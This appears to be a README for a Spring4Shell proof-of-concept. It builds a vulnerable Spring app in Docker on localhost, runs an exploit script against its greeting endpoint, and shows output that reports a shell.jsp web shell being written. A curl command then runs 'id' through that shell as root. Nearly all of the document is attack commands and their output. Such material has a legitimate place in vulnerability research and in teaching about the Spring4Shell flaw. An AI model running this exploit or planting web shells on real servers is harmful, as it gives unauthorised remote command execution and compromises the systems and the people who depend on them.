# POC

## Getting started

```bash
$ mvn clean install
```

```bash
$ docker build . -t spring4shell && docker run -p 8080:8080 --rm spring4shell
```

```bash
$ pip3 install requests

$ python3 exploit.py --url "http://localhost:8080/helloworld/greeting"
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://localhost:8080/shell.jsp?cmd=id
```

```bash
$ curl http://localhost:8080/shell.jsp\?cmd\=id --output -
# or browser
uid=0(root) gid=0(root) groups=0(root)
```

